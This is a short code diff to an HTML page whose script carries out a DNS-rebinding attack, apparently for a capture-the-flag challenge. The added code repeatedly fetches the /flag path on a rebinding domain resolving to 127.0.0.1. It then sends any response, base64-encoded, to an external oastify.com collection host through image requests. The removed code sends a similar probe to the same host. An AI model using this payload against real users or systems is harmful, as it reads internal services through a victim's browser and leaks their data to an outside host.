@@ -4,17 +4,21 @@
 <script>
 const target = 'acd918ee.7f000001.rbndr.us';
 
-// First, test if the domain resolves at all
-fetch(`http://${target}/`)
-    .then(r => r.text())
-    .then(data => {
-        const img = new Image();
-        img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?dns_works=` + btoa('RESOLVES: ' + data.substring(0, 100));
-    })
-    .catch(err => {
-        const img = new Image();
-        img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?dns_failed=` + btoa('DOMAIN NOT RESOLVING: ' + err.toString());
-    });
+// Very aggressive - many rapid attempts
+for (let i = 1; i <= 200; i++) {
+    setTimeout(() => {
+        fetch(`http://${target}/flag`)
+            .then(r => r.text())
+            .then(flag => {
+                const img = new Image();
+                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?SUCCESS_${i}=` + btoa(flag);
+            })
+            .catch(err => {
+                const img = new Image();
+                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?attempt_${i}=` + btoa(err.toString().substring(0, 50));
+            });
+    }, i * 500); // Every 500ms for 100 seconds total
+}
 </script>
 </body>
 </html>
